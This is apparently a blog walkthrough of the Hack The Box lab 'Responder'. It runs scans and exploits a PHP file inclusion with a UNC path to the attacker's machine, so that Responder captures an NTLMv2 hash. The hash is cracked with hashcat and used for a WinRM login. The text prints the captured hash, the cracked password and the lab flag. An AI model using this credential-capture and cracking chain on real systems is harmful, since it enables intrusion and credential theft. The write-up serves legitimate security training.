---
title: "HTB Very Easy: Responder"
date: 2023-09-04
layout: single
excerpt: "Basic Responder Usage"
classes: wide
header:
  teaser: "/assets/images/Responder/responder.png"
  teaser_home_page: true 
  #icon: "/assets/images/HTB_Laboratory"
categories:
    - HTB
tags:
    - responder
---

## Responder
## Very Easy


## Start (04Sept2023)


- Nmap

  ```bash

  nmap -sV -sC -T4 -oN responder.nmap responder.htb

  Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-04 17:17 EDT
  Nmap scan report for responder.htb (10.129.16.46)
  Host is up (0.19s latency).
  Not shown: 999 filtered tcp ports (no-response)
  PORT   STATE SERVICE VERSION
  80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
  |_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
  |_http-title: Site doesnt have a title (text/html; charset=UTF-8).

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 29.46 seconds


  nmap -sV -sC -p- -T4 -oN responder.nmap responder.htb


  Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-04 17:42 EDT
  Nmap scan report for responder.htb (10.129.16.46)
  Host is up (0.13s latency).
  Not shown: 65533 filtered tcp ports (no-response)
  PORT     STATE SERVICE VERSION
  80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
  |_http-title: Site doesnt have a title (text/html; charset=UTF-8).
  |_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
  5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
  |_http-title: Not Found
  |_http-server-header: Microsoft-HTTPAPI/2.0
  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 237.43 seconds

  ```

- Okay a php site, wonder if I need to upload any webshells...

- Checking out site, while gobustering it

  ```bash
  gobuster dir -u http://responder.htb  -x .php,.txt,.html -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt


  ===============================================================
  Gobuster v3.5
  by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
  ===============================================================
  [+] Url:                     http://responder.htb
  [+] Method:                  GET
  [+] Threads:                 10
  [+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
  [+] Negative Status codes:   404
  [+] User Agent:              gobuster/3.5
  [+] Extensions:              php,txt,html
  [+] Timeout:                 10s
  ===============================================================
  2023/09/04 17:30:55 Starting gobuster in directory enumeration mode
  ===============================================================
  /.html                (Status: 403) [Size: 302]
  /index.php            (Status: 200) [Size: 61]
  /img                  (Status: 301) [Size: 336] [--> http://responder.htb/img/]
  /english.html         (Status: 200) [Size: 46453]
  /css                  (Status: 301) [Size: 336] [--> http://responder.htb/css/]
  /Index.php            (Status: 200) [Size: 61]
  /examples             (Status: 503) [Size: 402]
  /js                   (Status: 301) [Size: 335] [--> http://responder.htb/js/]
  /french.html          (Status: 200) [Size: 47199]
  /English.html         (Status: 200) [Size: 46453]
  /german.html          (Status: 200) [Size: 46984]
  /licenses             (Status: 403) [Size: 421]
  /inc                  (Status: 301) [Size: 336] [--> http://responder.htb/inc/]


  ```

- Whenever I type in "responder.htb" I get:
- ![](/assets/images/Responder/20230904143259.png)
- it changes it to "unika.htb", the name of site, is there a dns problem???
- I update my hosts file so that "unika.htb" will point to the same ip as responder, this fixed it:
- ![](/assets/images/Responder/20230904143612.png)
- yay another web app, probs set to default configs or there is some vuln I need to sniff out
- I will note the go buster results, but going to check out the web app first, since it's "jucier"
  - There isn't really much to work with here, no login, no text input really (except contact us portion), and watching gobuster doesn't seem to be producing any results
  - I found the versions and stuff:
    ```
    Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1 Server at unika.htb Port 80
    ```
  - Still doesn't seem to give my any obvious exploits via searchsploit
- NMAP with a full port scan returned:
  ```bash

   5985/tcp open  http    Microsoft HTTPAPI httpd

  ```
  - WinRM is in the house, makes sense since the web app reported that this was a "Win64" box. Thus can I login with default creds??? Wait how do I login via winRM on a Kali box.... My memory... ah, it is called "evil-winrm"
  - nice Kali comes with this installed by default now
    ```bash

    evil-winrm -i responder.htb -u administrator


    Enter Password:

    Evil-WinRM shell v3.5

    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

    Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

    Info: Establishing connection to remote endpoint

    Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

    Error: Exiting with code 1

    ```
  - So default "Administrator" with no password did not work
  - I hooked up to my windows box to test a native winrm client via powershell:
    ```powershell

    Test-WSMan -Port 5555 127.0.0.1


    wsmid           : http://schemas.dmtf.org/wbem/wsman/identity/1/wsmanidentity.xsd
    ProtocolVersion : http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd
    ProductVendor   : Microsoft Corporation
    ProductVersion  : OS: 0.0.0 SP: 0.0 Stack: 3.0

    Enter-PSSession -ComputerName 127.0.0.1 -Port 5555 -Credential unika.htb\administrator


    Enter-PSSession : Connecting to remote server 127.0.0.1 failed with the following error message : Access is denied.
    For more information, see the about_Remote_Troubleshooting Help topic.
    At line:1 char:1
    + Enter-PSSession -ComputerName 127.0.0.1 -Port 5555 -Credential unika. ...
    + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        + CategoryInfo          : InvalidArgument: (127.0.0.1:String) [Enter-PSSession], PSRemotingTransportException
        + FullyQualifiedErrorId : CreateRemoteRunspaceFailed


    ```

  - as seen even from a windows box I still am getting errors, is the login so obvious I am just missing it??

  - Even though this is the weaker option I'm still going to run a crackmap to try to brute force passwords via winrm

  - 

- Crackmap for WinRM:
  ```bash

  Nothing Interesting

  ```

- trying Nikto as well

- Nikto

  ```bash

  nikto -h http://unika.htb


  - Nikto v2.5.0
  ---------------------------------------------------------------------------
  + Target IP:          10.129.16.46
  + Target Hostname:    unika.htb
  + Target Port:        80
  + Start Time:         2023-09-04 18:33:49 (GMT-4)
  ---------------------------------------------------------------------------
  + Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
  + /: Retrieved x-powered-by header: PHP/8.1.1.
  + /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
  + /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
  + OpenSSL/1.1.1m appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
  + Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
  + PHP/8.1.1 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
  + /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
  + /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
  + /index.php: PHP include error may indicate local or remote file inclusion is possible.
  + /css/: Directory indexing found.
  + /css/: This might be interesting.
  + /img/: Directory indexing found.
  + /img/: This might be interesting.
  + /icons/: Directory indexing found.
  + /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
  + 8769 requests: 0 error(s) and 15 item(s) reported on remote host
  + End Time:           2023-09-04 19:00:18 (GMT-4) (1589 seconds)
  ---------------------------------------------------------------------------
  + 1 host(s) tested


  ```
- Hydra Results were interesting, I guese "TRACE" is enabled on site so:
- ![](/assets/images/Responder/20230904154549.png)
  - but this didn't give my anything interesting, though good to know
- However there seems to be some sort of file inclusion issue as well with "index.php" 
  ```bash
  + /index.php: PHP include error may indicate local or remote file inclusion is possible.
  ```
- After screwing around a bit I found this:
- ![](/assets/images/Responder/20230904155551.png)
- Text:
  ```bash
  
  Warning: include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in C:\xampp\htdocs\index.php on line 11

  Warning: include(http://www.google.com/?): Failed to open stream: no suitable wrapper could be found in C:\xampp\htdocs\index.php on line 11

  Warning: include(): Failed opening 'http://www.google.com/?' for inclusion (include_path='\xampp\php\PEAR') in C:\xampp\htdocs\index.php on line 11

  ```

- So since "allow_url_include" seems to be set to 0, maybe I can instead do some local file inclusion??

- ![](/assets/images/Responder/20230904160121.png)
  - Interesting
- ![](/assets/images/Responder/20230904160424.png)
- After some more messing around I found I can grab the windows host file:
- ![](/assets/images/Responder/20230904160953.png)
- Nice, so LFI is a thing here (LFI inclusion list: https://github.com/carlospolop/Auto_Wordlists/tree/main)

- Now what to do with it

- Since this is a windows box we can use responder to maybe access an SMB share and get a ntlm string

- Responder
  ```bash
  responder -I tun0
                                          __
    .----.-----.-----.-----.-----.-----.--|  |.-----.----.
    |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
    |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                    |__|

            NBT-NS, LLMNR & MDNS Responder 3.1.3.0

    To support this project:
    Patreon -> https://www.patreon.com/PythonResponder
    Paypal  -> https://paypal.me/PythonResponder

    Author: Laurent Gaffie (laurent.gaffie@gmail.com)
    To kill this script hit CTRL-C


  [+] Poisoners:
      LLMNR                      [ON]
      NBT-NS                     [ON]
      MDNS                       [ON]
      DNS                        [ON]
      DHCP                       [OFF]

  [+] Servers:
      HTTP server                [ON]
      HTTPS server               [ON]
      WPAD proxy                 [OFF]
      Auth proxy                 [OFF]
      SMB server                 [ON]
      Kerberos server            [ON]
      SQL server                 [ON]
      FTP server                 [ON]
      IMAP server                [ON]
      POP3 server                [ON]
      SMTP server                [ON]
      DNS server                 [ON]
      LDAP server                [ON]
      RDP server                 [OFF]
      DCE-RPC server             [ON]
      WinRM server               [ON]

  [+] HTTP Options:
      Always serving EXE         [OFF]
      Serving EXE                [OFF]
      Serving HTML               [OFF]
      Upstream Proxy             [OFF]

  [+] Poisoning Options:
      Analyze Mode               [OFF]
      Force WPAD auth            [OFF]
      Force Basic Auth           [OFF]
      Force LM downgrade         [OFF]
      Force ESS downgrade        [OFF]

  [+] Generic Options:
      Responder NIC              [tun0]
      Responder IP               [10.10.16.2]
      Responder IPv6             [dead:beef:4::1000]
      Challenge set              [random]
      Don't Respond To Names     ['ISATAP']

  [+] Current Session Variables:
      Responder Machine Name     [WIN-E4YA2CVHYZV]
      Responder Domain Name      [49G2.LOCAL]
      Responder DCE-RPC Port     [49793]

  [+] Listening for events...

  ```

- Now trying my luck:

  ```bash

  http://unika.htb/index.php?page=//10.10.16.2/dummy

  ```
- ![](/assets/images/Responder/20230904193114.png)
- Nice Responder grabbed an NTLMv@-SSP String:
  ```bash

  [SMB] NTLMv2-SSP Client   : 10.129.16.158
  [SMB] NTLMv2-SSP Username : RESPONDER\Administrator
  [SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:5707fcef72508181:9A74B5B988868646F3376DD2C6BA0B27:010100000000000080B3FC227EDFD90168936705DF580A280000000002000800340039004700320001001E00570049004E002D004500340059004100320043005600480059005A00560004003400570049004E002D004500340059004100320043005600480059005A0056002E0034003900470032002E004C004F00430041004C000300140034003900470032002E004C004F00430041004C000500140034003900470032002E004C004F00430041004C000700080080B3FC227EDFD901060004000200000008003000300000000000000001000000002000003800650D543EDDA3FD065F9FFF2717F472824710A2089D690001C3A80225005C0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0032000000000000000000

  ```

- Now I just have to crack this password and be ready to go. Note the username "RESPONDER\Administrator", thus I could probaby use crackmap.exe to break in via WinRM like I was doing before since I wasn't using the correct username

- Trying crack map just for fun even though since I have the "hash" now a password cracking job would be a faster solution

- Thus going to try to crack the password using hashcat (my favorite)

- Nice it is already installed on Kali, though since it is a vm it might take some time, but its okay

- hashcat:
  ```bash
  hashcat -O -m 5600 ./ntlm2.txt /usr/share/wordlists/rockyou.txt /usr/share/hashcat/rules/*

  ADMINISTRATOR::RESPONDER:5707fcef72508181:9a74b5b988868646f3376dd2c6ba0b27:010100000000000080b3fc227edfd90168936705df580a280000000002000800340039004700320001001e00570049004e002d004500340059004100320043005600480059005a00560004003400570049004e002d004500340059004100320043005600480059005a0056002e0034003900470032002e004c004f00430041004c000300140034003900470032002e004c004f00430041004c000500140034003900470032002e004c004f00430041004c000700080080b3fc227edfd901060004000200000008003000300000000000000001000000002000003800650d543edda3fd065f9fff2717f472824710a2089d690001c3a80225005c0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0032000000000000000000:badminton

  Session..........: hashcat
  Status...........: Cracked
  Hash.Mode........: 5600 (NetNTLMv2)
  Hash.Target......: ADMINISTRATOR::RESPONDER:5707fcef72508181:9a74b5b98...000000
  Time.Started.....: Mon Sep  4 22:44:31 2023 (1 sec)
  Time.Estimated...: Mon Sep  4 22:44:32 2023 (0 secs)
  Kernel.Feature...: Optimized Kernel
  Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
  Guess.Queue......: 1/95 (1.05%)
  Speed.#1.........:    16521 H/s (1.64ms) @ Accel:256 Loops:1 Thr:1 Vec:4
  Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
  Progress.........: 3584/14344385 (0.02%)
  Rejected.........: 0/3584 (0.00%)
  Restore.Point....: 3072/14344385 (0.02%)
  Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
  Candidate.Engine.: Device Generator
  Candidates.#1....: adriano -> fresa

  Started: Mon Sep  4 22:43:30 2023
  Stopped: Mon Sep  4 22:44:33 202

  ```

- This might take a few, now it didn't. Damn even on a KVM version of Kali I was getting 16,000 hashes a second.


- `So the "RESPONDER\Administrator" password is "badminton"`
- logging in via winRM on windows:
- ![](/assets/images/Responder/20230904195142.png)
- And that worked!
- found the flag in `C:\Users\mike\Desktop`
## Root.txt: ea81b7afddd03efaa0945333ed147fac


- By the way crack map did find the correct password it just took forever:
  ```bash

  WINRM       10.129.16.158   5985   10.129.16.158    [-] RESPONDER\administrator:riley
  WINRM       10.129.16.158   5985   10.129.16.158    [-] RESPONDER\administrator:mylene
  WINRM       10.129.16.158   5985   10.129.16.158    [-] RESPONDER\administrator:jingjing
  WINRM       10.129.16.158   5985   10.129.16.158    [+] RESPONDER\administrator:badminton (Pwn3d!)

  ```

